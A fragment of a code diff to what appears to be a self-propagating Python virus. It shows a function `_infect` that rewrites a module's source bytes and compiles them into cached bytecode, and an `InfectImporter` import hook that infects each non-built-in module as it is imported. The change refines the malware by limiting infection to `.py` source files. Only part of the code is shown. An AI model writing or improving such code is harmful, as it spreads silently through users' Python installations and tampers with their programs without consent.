@@ -35,7 +35,6 @@ def _infect(filename):
         infected_bytes += line + b'\n'
         if b'from __future' in line:
             has_future = False
-
     code = loader.source_to_code(infected_bytes, filename)
     try:
         dirname = os.path.dirname(cfile)
@@ -68,7 +67,7 @@ class InfectImporter():
         if not self.inside:
             self.inside = True
             spec = importlib.util.find_spec(name, path)
-            if spec.origin and spec.origin != 'built-in':
+            if spec.origin and spec.origin != 'built-in' and spec.origin.endswith('.py'):
                 infect(spec.origin)
             self.inside = False
         return None
